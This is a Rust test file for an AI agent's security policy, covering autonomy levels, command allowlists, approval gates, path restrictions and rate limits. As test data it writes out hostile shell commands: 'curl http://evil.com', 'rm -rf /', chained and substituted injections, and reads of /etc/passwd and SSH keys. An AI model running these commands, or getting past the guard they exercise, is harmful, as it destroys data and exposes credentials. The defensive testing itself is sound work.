use super::*;

fn default_policy() -> SecurityPolicy {
    SecurityPolicy::default()
}

fn readonly_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        ..SecurityPolicy::default()
    }
}

fn full_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        ..SecurityPolicy::default()
    }
}

// ── AutonomyLevel ────────────────────────────────────────

#[test]
fn autonomy_default_is_supervised() {
    assert_eq!(AutonomyLevel::default(), AutonomyLevel::Supervised);
}

#[test]
fn autonomy_serde_roundtrip() {
    let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
    assert_eq!(json, "\"full\"");
    let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
    assert_eq!(parsed, AutonomyLevel::ReadOnly);
    let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
    assert_eq!(parsed2, AutonomyLevel::Supervised);
}

#[test]
fn can_act_readonly_false() {
    assert!(!readonly_policy().can_act());
}

#[test]
fn can_act_supervised_true() {
    assert!(default_policy().can_act());
}

#[test]
fn can_act_full_true() {
    assert!(full_policy().can_act());
}

#[test]
fn enforce_tool_operation_read_allowed_in_readonly_mode() {
    let p = readonly_policy();
    assert!(
        p.enforce_tool_operation(ToolOperation::Read, "memory_recall")
            .is_ok()
    );
}

#[test]
fn enforce_tool_operation_act_blocked_in_readonly_mode() {
    let p = readonly_policy();
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("read-only mode"));
}

#[test]
fn enforce_tool_operation_act_uses_rate_budget() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..default_policy()
    };
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("Rate limit exceeded"));
}

// ── is_command_allowed ───────────────────────────────────

#[test]
fn allowed_commands_basic() {
    let p = default_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("cargo build --release"));
    assert!(p.is_command_allowed("cat file.txt"));
    assert!(p.is_command_allowed("grep -r pattern ."));
    assert!(p.is_command_allowed("date"));
}

#[test]
fn blocked_commands_basic() {
    let p = default_policy();
    assert!(!p.is_command_allowed("rm -rf /"));
    assert!(!p.is_command_allowed("sudo apt install"));
    assert!(!p.is_command_allowed("curl http://evil.com"));
    assert!(!p.is_command_allowed("wget http://evil.com"));
    assert!(!p.is_command_allowed("ruby exploit.rb"));
    assert!(!p.is_command_allowed("perl malicious.pl"));
}

#[test]
fn readonly_blocks_all_commands() {
    let p = readonly_policy();
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat file.txt"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn full_autonomy_still_uses_allowlist() {
    let p = full_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("rm -rf /"));
}

#[test]
fn command_with_absolute_path_extracts_basename() {
    let p = default_policy();
    assert!(p.is_command_allowed("/usr/bin/git status"));
    assert!(p.is_command_allowed("/bin/ls -la"));
}

#[test]
fn allowlist_supports_explicit_executable_paths() {
    let p = SecurityPolicy {
        allowed_commands: vec!["/usr/bin/antigravity".into()],
        ..SecurityPolicy::default()
    };

    assert!(p.is_command_allowed("/usr/bin/antigravity"));
    assert!(!p.is_command_allowed("antigravity"));
}

#[test]
fn allowlist_supports_wildcard_entry() {
    let p = SecurityPolicy {
        allowed_commands: vec!["*".into()],
        ..SecurityPolicy::default()
    };

    assert!(p.is_command_allowed("python3 --version"));
    assert!(p.is_command_allowed("/usr/bin/antigravity"));

    // Wildcard still respects risk gates in validate_command_execution.
    let blocked = p.validate_command_execution("rm -rf /tmp/test", true);
    assert!(blocked.is_err());
    assert!(blocked.unwrap_err().contains("high-risk"));
}

#[test]
fn empty_command_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed(""));
    assert!(!p.is_command_allowed("   "));
}

#[test]
fn command_with_pipes_validates_all_segments() {
    let p = default_policy();
    // Both sides of the pipe are in the allowlist
    assert!(p.is_command_allowed("ls | grep foo"));
    assert!(p.is_command_allowed("cat file.txt | wc -l"));
    // Second command not in allowlist — blocked
    assert!(!p.is_command_allowed("ls | curl http://evil.com"));
    assert!(!p.is_command_allowed("echo hello | ruby -"));
}

#[test]
fn custom_allowlist() {
    let p = SecurityPolicy {
        allowed_commands: vec!["docker".into(), "kubectl".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("docker ps"));
    assert!(p.is_command_allowed("kubectl get pods"));
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("git status"));
}

#[test]
fn empty_allowlist_blocks_everything() {
    let p = SecurityPolicy {
        allowed_commands: vec![],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn command_risk_low_for_read_commands() {
    let p = default_policy();
    assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
    assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
}

#[test]
fn command_risk_medium_for_mutating_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["git".into(), "touch".into()],
        ..SecurityPolicy::default()
    };
    assert_eq!(
        p.command_risk_level("git reset --hard HEAD~1"),
        CommandRiskLevel::Medium
    );
    assert_eq!(
        p.command_risk_level("touch file.txt"),
        CommandRiskLevel::Medium
    );
}

#[test]
fn command_risk_high_for_dangerous_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["rm".into()],
        ..SecurityPolicy::default()
    };
    assert_eq!(
        p.command_risk_level("rm -rf /tmp/test"),
        CommandRiskLevel::High
    );
}

#[test]
fn validate_command_requires_approval_for_medium_risk() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        require_approval_for_medium_risk: true,
        allowed_commands: vec!["touch".into()],
        ..SecurityPolicy::default()
    };

    let denied = p.validate_command_execution("touch test.txt", false);
    assert!(denied.is_err());
    assert!(denied.unwrap_err().contains("requires explicit approval"),);

    let allowed = p.validate_command_execution("touch test.txt", true);
    assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_blocks_high_risk_via_wildcard() {
    // Wildcard allows the command through is_command_allowed, but
    // block_high_risk_commands still rejects it because "*" does not
    // count as an explicit allowlist entry.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["*".into()],
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("rm -rf /tmp/test", true);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("high-risk"));
}

#[test]
fn validate_command_allows_explicitly_listed_high_risk() {
    // When a high-risk command is explicitly in allowed_commands, the
    // block_high_risk_commands gate is bypassed — the operator has made
    // a deliberate decision to permit it.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        allowed_commands: vec!["curl".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("curl https://api.example.com/data", true);
    assert_eq!(result.unwrap(), CommandRiskLevel::High);
}

#[test]
fn validate_command_allows_wget_when_explicitly_listed() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        allowed_commands: vec!["wget".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("wget https://releases.example.com/v1.tar.gz", true);
    assert_eq!(result.unwrap(), CommandRiskLevel::High);
}

#[test]
fn validate_command_blocks_non_listed_high_risk_when_another_is_allowed() {
    // Allowing curl explicitly should not exempt wget.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        allowed_commands: vec!["curl".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("wget https://evil.com", true);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not allowed"));
}

#[test]
fn validate_command_explicit_rm_bypasses_high_risk_block() {
    // Operator explicitly listed "rm" — they accept the risk.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        allowed_commands: vec!["rm".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("rm -rf /tmp/test", true);
    assert_eq!(result.unwrap(), CommandRiskLevel::High);
}

#[test]
fn validate_command_high_risk_still_needs_approval_in_supervised() {
    // Even when explicitly allowed, supervised mode still requires
    // approval for high-risk commands (the approval gate is separate
    // from the block gate).
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["curl".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };

    let denied = p.validate_command_execution("curl https://api.example.com", false);
    assert!(denied.is_err());
    assert!(denied.unwrap_err().contains("requires explicit approval"));

    let allowed = p.validate_command_execution("curl https://api.example.com", true);
    assert_eq!(allowed.unwrap(), CommandRiskLevel::High);
}

#[test]
fn validate_command_pipe_needs_all_segments_explicitly_allowed() {
    // When a pipeline contains a high-risk command, every segment
    // must be explicitly allowed for the exemption to apply.
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        allowed_commands: vec!["curl".into(), "grep".into()],
        block_high_risk_commands: true,
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("curl https://api.example.com | grep data", true);
    assert_eq!(result.unwrap(), CommandRiskLevel::High);
}

#[test]
fn validate_command_full_mode_skips_medium_risk_approval_gate() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        require_approval_for_medium_risk: true,
        allowed_commands: vec!["touch".into()],
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("touch test.txt", false);
    assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_rejects_background_chain_bypass() {
    let p = default_policy();
    let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not allowed"));
}

// ── is_path_allowed ─────────────────────────────────────

#[test]
fn relative_paths_allowed() {
    let p = default_policy();
    assert!(p.is_path_allowed("file.txt"));
    assert!(p.is_path_allowed("src/main.rs"));
    assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
}

#[test]
fn path_traversal_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("../etc/passwd"));
    assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
    assert!(!p.is_path_allowed(".."));
}

#[test]
fn absolute_paths_blocked_when_workspace_only() {
    let p = default_policy();
    assert!(!p.is_path_allowed("/etc/passwd"));
    assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("/tmp/file.txt"));
}

#[test]
fn absolute_path_inside_workspace_allowed_when_workspace_only() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/.zeroclaw/workspace"),
        workspace_only: true,
        ..SecurityPolicy::default()
    };
    // Absolute path inside workspace should be allowed
    assert!(p.is_path_allowed("/home/user/.zeroclaw/workspace/images/example.png"));
    assert!(p.is_path_allowed("/home/user/.zeroclaw/workspace/file.txt"));
    // Absolute path outside workspace should still be blocked
    assert!(!p.is_path_allowed("/home/user/other/file.txt"));
    assert!(!p.is_path_allowed("/tmp/file.txt"));
}

#[test]
fn absolute_path_in_allowed_root_permitted_when_workspace_only() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/.zeroclaw/workspace"),
        workspace_only: true,
        allowed_roots: vec![PathBuf::from("/home/user/.zeroclaw/shared")],
        ..SecurityPolicy::default()
    };
    // Path in allowed root should be permitted
    assert!(p.is_path_allowed("/home/user/.zeroclaw/shared/data.txt"));
    // Path in workspace should still be permitted
    assert!(p.is_path_allowed("/home/user/.zeroclaw/workspace/file.txt"));
    // Path outside both should still be blocked
    assert!(!p.is_path_allowed("/home/user/other/file.txt"));
}

#[test]
fn absolute_paths_allowed_when_not_workspace_only() {
    let p = SecurityPolicy {
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(p.is_path_allowed("/tmp/file.txt"));
}

#[test]
fn forbidden_paths_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/etc/passwd"));
    assert!(!p.is_path_allowed("/root/.bashrc"));
    assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
}

#[test]
fn empty_path_allowed() {
    let p = default_policy();
    assert!(p.is_path_allowed(""));
}

#[test]
fn dotfile_in_workspace_allowed() {
    let p = default_policy();
    assert!(p.is_path_allowed(".gitignore"));
    assert!(p.is_path_allowed(".env"));
}

// ── from_config ─────────────────────────────────────────

#[test]
fn from_config_maps_all_fields() {
    let autonomy_config = crate::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        allowed_commands: vec!["docker".into()],
        forbidden_paths: vec!["/secret".into()],
        max_actions_per_hour: 100,
        max_cost_per_day_cents: 1000,
        require_approval_for_medium_risk: false,
        block_high_risk_commands: false,
        shell_env_passthrough: vec!["DATABASE_URL".into()],
        ..crate::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test-workspace");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

    assert_eq!(policy.autonomy, AutonomyLevel::Full);
    assert!(!policy.workspace_only);
    assert_eq!(policy.allowed_commands, vec!["docker"]);
    assert_eq!(policy.forbidden_paths, vec!["/secret"]);
    assert_eq!(policy.max_actions_per_hour, 100);
    assert_eq!(policy.max_cost_per_day_cents, 1000);
    assert!(!policy.require_approval_for_medium_risk);
    assert!(!policy.block_high_risk_commands);
    assert_eq!(policy.shell_env_passthrough, vec!["DATABASE_URL"]);
    assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
}

#[test]
fn from_config_normalizes_allowed_roots() {
    let autonomy_config = crate::config::AutonomyConfig {
        allowed_roots: vec!["~/Desktop".into(), "shared-data".into()],
        ..crate::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test-workspace");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

    let expected_home_root = if let Some(home) = std::env::var_os("HOME") {
        PathBuf::from(home).join("Desktop")
    } else {
        PathBuf::from("~/Desktop")
    };

    assert_eq!(policy.allowed_roots[0], expected_home_root);
    assert_eq!(policy.allowed_roots[1], workspace.join("shared-data"));
}

#[test]
fn resolved_path_violation_message_includes_allowed_roots_guidance() {
    let p = default_policy();
    let msg = p.resolved_path_violation_message(Path::new("/tmp/outside.txt"));
    assert!(msg.contains("escapes workspace"));
    assert!(msg.contains("allowed_roots"));
}

// ── Default policy ──────────────────────────────────────

#[test]
fn default_policy_has_sane_values() {
    let p = SecurityPolicy::default();
    assert_eq!(p.autonomy, AutonomyLevel::Supervised);
    assert!(p.workspace_only);
    assert!(!p.allowed_commands.is_empty());
    assert!(!p.forbidden_paths.is_empty());
    assert!(p.max_actions_per_hour > 0);
    assert!(p.max_cost_per_day_cents > 0);
    assert!(p.require_approval_for_medium_risk);
    assert!(p.block_high_risk_commands);
    assert!(p.shell_env_passthrough.is_empty());
}

// ── ActionTracker / rate limiting ───────────────────────

#[test]
fn action_tracker_starts_at_zero() {
    let tracker = ActionTracker::new();
    assert_eq!(tracker.count(), 0);
}

#[test]
fn action_tracker_records_actions() {
    let tracker = ActionTracker::new();
    assert_eq!(tracker.record(), 1);
    assert_eq!(tracker.record(), 2);
    assert_eq!(tracker.record(), 3);
    assert_eq!(tracker.count(), 3);
}

#[test]
fn record_action_allows_within_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 5,
        ..SecurityPolicy::default()
    };
    for _ in 0..5 {
        assert!(p.record_action(), "should allow actions within limit");
    }
}

#[test]
fn record_action_blocks_over_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 3,
        ..SecurityPolicy::default()
    };
    assert!(p.record_action()); // 1
    assert!(p.record_action()); // 2
    assert!(p.record_action()); // 3
    assert!(!p.record_action()); // 4 — over limit
}

#[test]
fn is_rate_limited_reflects_count() {
    let p = SecurityPolicy {
        max_actions_per_hour: 2,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_rate_limited());
    p.record_action();
    assert!(!p.is_rate_limited());
    p.record_action();
    assert!(p.is_rate_limited());
}

#[test]
fn action_tracker_clone_is_independent() {
    let tracker = ActionTracker::new();
    tracker.record();
    tracker.record();
    let cloned = tracker.clone();
    assert_eq!(cloned.count(), 2);
    tracker.record();
    assert_eq!(tracker.count(), 3);
    assert_eq!(cloned.count(), 2); // clone is independent
}

// ── Edge cases: command injection ────────────────────────

#[test]
fn command_injection_semicolon_blocked() {
    let p = default_policy();
    // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
    // This is a safe default: chained commands are blocked.
    assert!(!p.is_command_allowed("ls; rm -rf /"));
}

#[test]
fn command_injection_semicolon_no_space() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls;rm -rf /"));
}

#[test]
fn quoted_semicolons_do_not_split_sqlite_command() {
    let p = SecurityPolicy {
        allowed_commands: vec!["sqlite3".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed(
        "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
    ));
    assert_eq!(
            p.command_risk_level(
                "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
            ),
            CommandRiskLevel::Low
        );
}

#[test]
fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["sqlite3".into()],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /"));
}

#[test]
fn command_injection_backtick_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo `whoami`"));
    assert!(!p.is_command_allowed("echo `rm -rf /`"));
}

#[test]
fn command_injection_dollar_paren_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
    assert!(!p.is_command_allowed("echo $(rm -rf /)"));
}

#[test]
fn command_injection_dollar_paren_literal_inside_single_quotes_allowed() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo '$(cat /etc/passwd)'"));
}

#[test]
fn command_injection_dollar_brace_literal_inside_single_quotes_allowed() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo '${HOME}'"));
}

#[test]
fn command_injection_dollar_brace_unquoted_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo ${HOME}"));
}

#[test]
fn command_with_env_var_prefix() {
    let p = default_policy();
    // "FOO=bar" is the first word — not in allowlist
    assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
}

#[test]
fn command_newline_injection_blocked() {
    let p = default_policy();
    // Newline splits into two commands; "rm" is not in allowlist
    assert!(!p.is_command_allowed("ls\nrm -rf /"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls\necho hello"));
}

#[test]
fn command_injection_and_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls && rm -rf /"));
    assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls && echo done"));
}

#[test]
fn command_injection_or_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls || rm -rf /"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls || echo fallback"));
}

#[test]
fn command_injection_background_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls & rm -rf /"));
    assert!(!p.is_command_allowed("ls&rm -rf /"));
    assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
}

#[test]
fn command_injection_redirect_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
    assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
    assert!(!p.is_command_allowed("cat </etc/passwd"));
    assert!(!p.is_command_allowed("cat</etc/passwd"));
}

#[test]
fn safe_redirect_to_dev_null_allowed() {
    let p = default_policy();
    // stdout to /dev/null
    assert!(p.is_command_allowed("echo secret > /dev/null"));
    // stderr to /dev/null
    assert!(p.is_command_allowed("ls 2> /dev/null"));
    // both stdout and stderr to /dev/null
    assert!(p.is_command_allowed("find . 2>&1 > /dev/null"));
    // inline redirection form
    assert!(p.is_command_allowed("cat</dev/null"));
}

#[test]
fn safe_redirect_to_dev_stdout_allowed() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo hello > /dev/stdout"));
    assert!(p.is_command_allowed("cat /dev/zero > /dev/stdout"));
}

#[test]
fn safe_redirect_to_dev_stderr_allowed() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo error > /dev/stderr"));
    assert!(p.is_command_allowed("ls 1> /dev/stderr"));
}

#[test]
fn safe_redirect_to_dev_zero_allowed() {
    let p = default_policy();
    assert!(p.is_command_allowed("cat /dev/zero > /dev/null"));
}

#[test]
fn safe_file_descriptor_redirect_allowed() {
    let p = default_policy();
    // stderr to stdout
    assert!(p.is_command_allowed("find . 2>&1"));
    // stdout to stderr
    assert!(p.is_command_allowed("echo hello 1>&2"));
    // combined with safe target
    assert!(p.is_command_allowed("ls 2>&1 > /dev/null"));
}

#[test]
fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo \"A&B\""));
    assert!(p.is_command_allowed("echo \"A>B\""));
    assert!(p.is_command_allowed("echo \"A<B\""));
}

#[test]
fn command_argument_injection_blocked() {
    let p = default_policy();
    // find -exec is a common bypass
    assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
    assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
    // git config/alias can execute commands
    assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
    assert!(!p.is_command_allowed("git alias.st status"));
    assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
    // Legitimate commands should still work
    assert!(p.is_command_allowed("find . -name '*.txt'"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("git add ."));
}

#[test]
fn command_injection_dollar_brace_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
}

#[test]
fn command_injection_plain_dollar_var_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("cat $HOME/.ssh/id_rsa"));
    assert!(!p.is_command_allowed("cat $SECRET_FILE"));
}

#[test]
fn command_injection_tee_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
    assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
    assert!(!p.is_command_allowed("tee file.txt"));
}

#[test]
fn command_injection_process_substitution_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("cat <(echo pwned)"));
    assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
}

#[test]
fn command_env_var_prefix_with_allowed_cmd() {
    let p = default_policy();
    // env assignment + allowed command — OK
    assert!(p.is_command_allowed("FOO=bar ls"));
    assert!(p.is_command_allowed("LANG=C grep pattern file"));
    // env assignment + disallowed command — blocked
    assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
}

#[test]
fn forbidden_path_argument_detects_absolute_path() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("cat /etc/passwd"),
        Some("/etc/passwd".into())
    );
}

#[test]
fn forbidden_path_argument_detects_parent_dir_reference() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("cat ../secret.txt"),
        Some("../secret.txt".into())
    );
    assert_eq!(
        p.forbidden_path_argument("find .. -name '*.rs'"),
        Some("..".into())
    );
}

#[test]
fn forbidden_path_argument_allows_workspace_relative_paths() {
    let p = default_policy();
    assert_eq!(p.forbidden_path_argument("cat src/main.rs"), None);
    assert_eq!(p.forbidden_path_argument("grep -r todo ./src"), None);
}

#[test]
fn forbidden_path_argument_detects_option_assignment_paths() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("grep --file=/etc/passwd root ./src"),
        Some("/etc/passwd".into())
    );
    assert_eq!(
        p.forbidden_path_argument("cat --input=../secret.txt"),
        Some("../secret.txt".into())
    );
}

#[test]
fn forbidden_path_argument_allows_safe_option_assignment_paths() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("grep --file=./patterns.txt root ./src"),
        None
    );
}

#[test]
fn forbidden_path_argument_detects_short_option_attached_paths() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("grep -f/etc/passwd root ./src"),
        Some("/etc/passwd".into())
    );
    assert_eq!(
        p.forbidden_path_argument("git -C../outside status"),
        Some("../outside".into())
    );
}

#[test]
fn forbidden_path_argument_allows_safe_short_option_attached_paths() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("grep -f./patterns.txt root ./src"),
        None
    );
    assert_eq!(p.forbidden_path_argument("git -C./repo status"), None);
}

#[test]
fn forbidden_path_argument_detects_tilde_user_paths() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("cat ~root/.ssh/id_rsa"),
        Some("~root/.ssh/id_rsa".into())
    );
    assert_eq!(
        p.forbidden_path_argument("ls ~nobody"),
        Some("~nobody".into())
    );
}

#[test]
fn forbidden_path_argument_detects_input_redirection_paths() {
    let p = default_policy();
    assert_eq!(
        p.forbidden_path_argument("cat </etc/passwd"),
        Some("/etc/passwd".into())
    );
    assert_eq!(
        p.forbidden_path_argument("cat</etc/passwd"),
        Some("/etc/passwd".into())
    );
}

// ── Edge cases: path traversal ──────────────────────────

#[test]
fn path_traversal_encoded_dots() {
    let p = default_policy();
    // Literal ".." in path — always blocked
    assert!(!p.is_path_allowed("foo/..%2f..%2fetc/passwd"));
}

#[test]
fn path_traversal_double_dot_in_filename() {
    let p = default_policy();
    // ".." in a filename (not a path component) is allowed
    assert!(p.is_path_allowed("my..file.txt"));
    // But actual traversal components are still blocked
    assert!(!p.is_path_allowed("../etc/passwd"));
    assert!(!p.is_path_allowed("foo/../etc/passwd"));
}

#[test]
fn path_with_null_byte_blocked() {
    let p = default_policy();
    assert!(!p.is_path_allowed("file\0.txt"));
}

#[test]
fn path_symlink_style_absolute() {
    let p = default_policy();
    assert!(!p.is_path_allowed("/proc/self/root/etc/passwd"));
}

#[test]
fn path_home_tilde_ssh() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("~/.gnupg/secring.gpg"));
    assert!(!p.is_path_allowed("~root/.ssh/id_rsa"));
    assert!(!p.is_path_allowed("~nobody"));
}

#[test]
fn path_var_run_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/var/run/docker.sock"));
}

// ── Edge cases: rate limiter boundary ────────────────────

#[test]
fn rate_limit_exactly_at_boundary() {
    let p = SecurityPolicy {
        max_actions_per_hour: 1,
        ..SecurityPolicy::default()
    };
    assert!(p.record_action()); // 1 — exactly at limit
    assert!(!p.record_action()); // 2 — over
    assert!(!p.record_action()); // 3 — still over
}

#[test]
fn rate_limit_zero_blocks_everything() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..SecurityPolicy::default()
    };
    assert!(!p.record_action());
}

#[test]
fn rate_limit_high_allows_many() {
    let p = SecurityPolicy {
        max_actions_per_hour: 10000,
        ..SecurityPolicy::default()
    };
    for _ in 0..100 {
        assert!(p.record_action());
    }
}

// ── Edge cases: autonomy + command combos ────────────────

#[test]
fn readonly_blocks_even_safe_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        allowed_commands: vec!["ls".into(), "cat".into()],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat"));
    assert!(!p.can_act());
}

#[test]
fn supervised_allows_listed_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["git".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("git status"));
    assert!(!p.is_command_allowed("docker ps"));
}

#[test]
fn full_autonomy_still_respects_forbidden_paths() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_allowed("/etc/shadow"));
    assert!(!p.is_path_allowed("/root/.bashrc"));
}

#[test]
fn workspace_only_false_allows_resolved_outside_workspace() {
    let workspace = std::env::temp_dir().join("zeroclaw_test_ws_only_false");
    let _ = std::fs::create_dir_all(&workspace);
    let canonical_workspace = workspace
        .canonicalize()
        .unwrap_or_else(|_| workspace.clone());

    let p = SecurityPolicy {
        workspace_dir: canonical_workspace.clone(),
        workspace_only: false,
        forbidden_paths: vec!["/etc".into(), "/var".into()],
        ..SecurityPolicy::default()
    };

    // Path outside workspace should be allowed when workspace_only=false
    let outside = std::env::var_os("HOME")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("/home"))
        .join("zeroclaw_outside_ws");
    assert!(
        p.is_resolved_path_allowed(&outside),
        "workspace_only=false must allow resolved paths outside workspace"
    );

    // Forbidden paths must still be blocked even with workspace_only=false
    assert!(
        !p.is_resolved_path_allowed(Path::new("/etc/passwd")),
        "forbidden paths must be blocked even when workspace_only=false"
    );
    assert!(
        !p.is_resolved_path_allowed(Path::new("/var/run/docker.sock")),
        "forbidden /var must be blocked even when workspace_only=false"
    );

    let _ = std::fs::remove_dir_all(&workspace);
}

#[test]
